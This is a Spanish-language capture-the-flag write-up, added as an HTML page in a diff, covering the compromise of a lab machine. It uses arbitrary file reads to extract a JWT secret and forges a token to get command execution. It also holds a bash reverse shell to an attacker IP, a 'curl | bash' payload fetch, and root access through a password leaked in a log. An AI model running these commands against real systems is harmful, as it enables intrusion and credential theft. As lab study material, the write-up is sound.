+                <p>Para entender dónde está ubicado el código de la aplicación, leo <code>/proc/self/cmdline</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/proc/self/cmdline"}'</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-json">{"file":"/home/htb/uhc/.venv/bin/python3\u0000-c\u0000from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)\u0000--multiprocessing-fork\u0000"}</code></pre>
+
+                <p>Esto revela que la aplicación se está ejecutando desde <code>/home/htb/uhc</code>. Confirmo esto leyendo <code>/proc/self/environ</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/proc/self/environ"}'</code></pre>
+
+                <p>Las variables de entorno muestran:</p>
+                <pre><code class="language-plaintext">APP_MODULE=app.main:app
+PWD=/home/htb/uhc
+HOME=/home/htb
+VIRTUAL_ENV=/home/htb/uhc/.venv</code></pre>
+
+                <p>La variable <code>APP_MODULE</code> indica que el archivo principal de la aplicación está en <code>app/main.py</code>.</p>
+
+                <h3>Extrayendo el Secreto JWT</h3>
+                <p>Leo el archivo principal de la aplicación:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/home/htb/uhc/app/main.py"}'</code></pre>
+
+                <p>En <code>main.py</code>, encuentro una declaración de importación:</p>
+                <pre><code class="language-python">from app.core.config import settings</code></pre>
+
+                <p>Esto indica que hay un archivo de configuración en <code>app/core/config.py</code> o <code>app/core/settings.py</code>. Intento leer el archivo de settings:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/home/htb/uhc/app/core/settings.py"}'</code></pre>
+
+                <p>¡Éxito! El archivo de configuración contiene varios valores sensibles:</p>
+                <pre><code class="language-python">JWT_SECRET: str = "SuperSecretSigningKey-HTB"
+SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
+FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"</code></pre>
+
+                <p>Ahora tengo el secreto de firmado JWT: <code>SuperSecretSigningKey-HTB</code>.</p>
+
+                <h2>Falsificación JWT y Ejecución de Comandos</h2>
+                <p>Con el secreto JWT, puedo falsificar un token que incluya el flag <code>debug</code>. Utilizo un debugger JWT online o un script Python para crear un nuevo token con el siguiente payload:</p>
+                <p><img src="./media/image2.png" alt="Payload del token JWT mostrando type, exp, iat, sub, is_superuser establecido en true, guid, y debug establecido en true" /></p>
+
+                <p>La modificación clave es agregar <code>"debug": true</code> al payload, junto con mantener <code>"is_superuser": true</code>. Firmo esto con el secreto <code>SuperSecretSigningKey-HTB</code> usando el algoritmo HS256.</p>
+
+                <h3>Probando la Ejecución de Comandos</h3>
+                <p>Con mi token falsificado, pruebo el endpoint de ejecución de comandos:</p>
+                <pre><code class="language-bash">curl "http://10.10.11.161/api/v1/admin/exec/id" \
+  -H "Authorization: Bearer {forged_token}"</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-plaintext">"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"</code></pre>
+
+                <p>¡Excelente! Ahora tengo ejecución de comandos como usuario <code>htb</code>.</p>
+
+                <h2>Obteniendo una Reverse Shell</h2>
+                <p>Para obtener una shell adecuada, necesito ejecutar un payload de reverse shell. Sin embargo, pasar comandos complejos con caracteres especiales a través de una ruta URL es problemático - las barras en <code>/dev/tcp/</code> se interpretan como separadores de ruta, e incluso la codificación URL no funciona.</p>
+
+                <p>Mi solución es alojar el payload de reverse shell en mi máquina atacante y hacer que el objetivo lo obtenga y ejecute:</p>
+
+                <h3>Configurando el Payload</h3>
+                <p>Creo un archivo <code>index.html</code> conteniendo una reverse shell de bash:</p>
+                <pre><code class="language-bash">cat > index.html << 'EOF'
+bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"
+EOF</code></pre>
+
+                <p>Inicio un servidor HTTP de Python para servir este archivo:</p>
+                <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+
+                <p>Luego configuro un listener de netcat para capturar la reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <h3>Activando la Reverse Shell</h3>
+                <p>Ejecuto el siguiente comando a través de la API, que obtiene mi payload y lo canaliza a bash:</p>
+                <pre><code class="language-bash">curl "http://10.10.11.161/api/v1/admin/exec/curl%2010.10.16.2:8000%20|bash" \
+  -H "Authorization: Bearer {forged_token}"</code></pre>
+
+                <p>Mi servidor de Python registra la petición:</p>
+                <pre><code class="language-plaintext">10.10.11.161 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>Y mi listener de netcat recibe la conexión:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.161] 40450
+bash: cannot set terminal process group (668): Inappropriate ioctl for device
+bash: no job control in this shell
+htb@backend:~/uhc$</code></pre>
+
+                <p>Ahora tengo una shell como usuario <code>htb</code>.</p>
+
+                <h2>Escalada de Privilegios a Root</h2>
+                <p>Después de estabilizar mi shell, comienzo a enumerar el sistema en busca de vectores de escalada de privilegios. Mientras exploro el directorio de la aplicación, descubro un archivo de log de autenticación:</p>
+                <pre><code class="language-bash">cat ~/uhc/auth.log</code></pre>
+
+                <p>Entre las entradas, encuentro un intento de inicio de sesión fallido que revela lo que parece ser una contraseña:</p>
+                <pre><code class="language-plaintext">01/06/2026, 15:39:26 - Login Failure for Tr0ub4dor&3</code></pre>
+
+                <p>La cadena <code>Tr0ub4dor&3</code> parece una contraseña que fue accidentalmente introducida como nombre de usuario. Pruebo esta contraseña con el usuario <code>htb</code>:</p>
+                <pre><code class="language-bash">su htb
+Password: Tr0ub4dor&3</code></pre>
+
+                <p>Esto no funciona, pero probándola con <code>root</code> tiene éxito:</p>
+                <pre><code class="language-bash">su root
+Password: Tr0ub4dor&3</code></pre>
+
+                <p>Ahora soy root y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
